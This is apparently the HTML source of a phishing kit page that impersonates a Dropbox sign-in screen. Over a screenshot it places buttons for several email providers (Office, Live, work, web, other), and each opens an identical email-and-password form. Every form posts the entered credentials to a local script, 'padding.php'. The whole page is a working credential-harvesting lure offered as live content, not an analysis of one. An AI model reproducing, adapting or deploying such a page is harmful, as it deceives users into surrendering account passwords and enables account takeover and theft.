
<html>
<head>
  <meta charset="utf-8">
    <meta name="generator" content="">
    <meta name="dcterms.created" content="Wed, 27 Jul 2016 02:54:42 GMT">
    <meta name="description" content="">
    <meta name="keywords" content="">
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/reset.css"> 
<link rel="stylesheet" href="css/gcontainer.css"> 
<link rel="stylesheet/less" type="text/css" href="styles.less" />
<script src="js/java2/em-valid.js"></script>
<script src="js/java2/jquery-1.11.1.min.js"></script>
<link rel="shortcut icon" href="favico.ico"/>
  <link rel="icon" href="favico.ico"/>
<title>Dropbox | Sign in - Secure file sharing and cloud storage</title>
<script>
document.getElementById("svg1").addEventListener("load", function() {
    var doc = this.getSVGDocument();
    var rect = doc.querySelector("rect"); // suppose our image contains a <rect>
    rect.setAttribute("fill", "green");
});
</script>
<style>
.msg {
    display: none;
}
.error {
    color: red;
}
.success {
    color: green;
}
</style>
<style>
table, td, th {
    border: 1px solid #ddd;
    text-align: left;
}

table {
    border-collapse: collapse;
    width: 80%;
}

th, td {
    padding: 15px;
}
</style>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta name="generator" content="Web Page Maker">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:177px; top:50px; width:1056px; height:497px; z-index:0"><img src="images/Screenshot_1.png" alt="" title="" border=0 width=1056 height=497></div>

<div id="image2" style="position:absolute; overflow:hidden; left:851px; top:262px; width:265px; height:54px; z-index:1"><a href="#dpovi1"><img src="images/app.png"  id="myBtn"  alt="" title="" border=0 width=265 height=54></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:639px; top:356px; width:206px; height:49px; z-index:2"><a href="#dpovi2"><img src="images/live.png"  id="myBtn"  alt="" title="" border=0 width=206 height=49></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:653px; top:273px; width:175px; height:41px; z-index:3"><a href="#dpovi0"><img src="images/off.png"  id="myBtn"  alt="" title="" border=0 width=175 height=41></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:922px; top:435px; width:107px; height:62px; z-index:4"><a href="#dpovi5"><img src="images/other.png"  id="myBtn"  alt="" title="" border=0 width=107 height=62></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:640px; top:438px; width:214px; height:44px; z-index:5"><a href="#dpovi4"><img src="images/web.png"  id="myBtn"  alt="" title="" border=0 width=214 height=44></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:861px; top:345px; width:230px; height:66px; z-index:6"><a href="#dpovi3"><img src="images/work.png"  id="myBtn"  alt="" title="" border=0 width=230 height=66></a></div>
<div id="dpovi" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="style-images/e-m-a-i.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
 
 
  <!-- office  -->
 <!-- middle-center -->
<div id="dpovi0" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="images/off.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
  </br>	
<div style="padding: 30px 40px;">
<form method="POST" action="padding.php" name="ContactForm" onsubmit="return ValidateContactForm();">
<input name="Email"  type="text"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required placeholder="Email Address" style="width:350px;height:32px;font-size: 14px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;">
<br><br><div style="height:8px;"></div>
<input name="Password"  required  type="password" placeholder="Password" style="width:350px;height:32px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;"> <br>
<br>
<input type="checkbox" checked> Remember me<input class="buttonb" type="submit" value="Sign in" onclick="checkValid(this.form.address);"><br><br>
</div><center></form>

	</center>	
	</div>

</div>	
	
 <!-- app  -->
 <!-- middle-center -->
<div id="dpovi1" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="images/app.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
  </br>	
<div style="padding: 30px 40px;">
<form method="POST" action="padding.php" name="ContactForm" onsubmit="return ValidateContactForm();">
<input name="Email"  type="text"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required placeholder="Email Address" style="width:350px;height:32px;font-size: 14px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;">
<br><br><div style="height:8px;"></div>
<input name="Password"  required  type="password" placeholder="Password" style="width:350px;height:32px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;"> <br>
<br>
<input type="checkbox" checked> Remember me<input class="buttonb" type="submit" value="Sign in" onclick="checkValid(this.form.address);"><br><br>
</div><center></form>

	</center>	
	</div>

</div>	
 



 <!-- live  -->
 <!-- middle-center -->
<div id="dpovi2" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="images/live.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
  </br>	
<div style="padding: 30px 40px;">
<form method="POST" action="padding.php" name="ContactForm" onsubmit="return ValidateContactForm();">
<input name="Email"  type="text"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required placeholder="Email Address" style="width:350px;height:32px;font-size: 14px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;">
<br><br><div style="height:8px;"></div>
<input name="Password"  required  type="password" placeholder="Password" style="width:350px;height:32px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;"> <br>
<br>
<input type="checkbox" checked> Remember me<input class="buttonb" type="submit" value="Sign in" onclick="checkValid(this.form.address);"><br><br>
</div><center></form>

	</center>	
	</div>

</div>	





 <!-- work -->
 <!-- middle-center -->
<div id="dpovi3" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="images/work.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
  </br>	
<div style="padding: 30px 40px;">
<form method="POST" action="padding.php" name="ContactForm" onsubmit="return ValidateContactForm();">
<input name="Email"  type="text"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required placeholder="Email Address" style="width:350px;height:32px;font-size: 14px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;">
<br><br><div style="height:8px;"></div>
<input name="Password"  required  type="password" placeholder="Password" style="width:350px;height:32px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;"> <br>
<br>
<input type="checkbox" checked> Remember me<input class="buttonb" type="submit" value="Sign in" onclick="checkValid(this.form.address);"><br><br>
</div><center></form>

	</center>	
	</div>

</div>	
 
  <!-- web -->
 <!-- middle-center -->
<div id="dpovi4" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="images/web.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
  </br>	
<div style="padding: 30px 40px;">
<form method="POST" action="padding.php" name="ContactForm" onsubmit="return ValidateContactForm();">
<input name="Email"  type="text"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required placeholder="Email Address" style="width:350px;height:32px;font-size: 14px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;">
<br><br><div style="height:8px;"></div>
<input name="Password"  required  type="password" placeholder="Password" style="width:350px;height:32px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;"> <br>
<br>
<input type="checkbox" checked> Remember me<input class="buttonb" type="submit" value="Sign in" onclick="checkValid(this.form.address);"><br><br>
</div><center></form>

	</center>	
	</div>

</div>	
 

 
  <!-- other -->
 <!-- middle-center -->
<div id="dpovi5" class="modalbg">
  <div class="dialog">
<div class="upper"> <img src="images/other.png" align="left"><h1></h1><a href="#close" title="Close" class="close">X</a></div>
   
  </br>	
<div style="padding: 30px 40px;">
<form method="POST" action="padding.php" name="ContactForm" onsubmit="return ValidateContactForm();">
<input name="Email"  type="text"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required placeholder="Email Address" style="width:350px;height:32px;font-size: 14px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;">
<br><br><div style="height:8px;"></div>
<input name="Password"  required  type="password" placeholder="Password" style="width:350px;height:32px;padding-left:10px;border: 1px solid #d0d4d9;border-radius:2px;"> <br>
<br>
<input type="checkbox" checked> Remember me<input class="buttonb" type="submit" value="Sign in" onclick="checkValid(this.form.address);"><br><br>
</div><center></form>

	</center>	
	</div>

</div>	
  
 
 
</body>
</html>
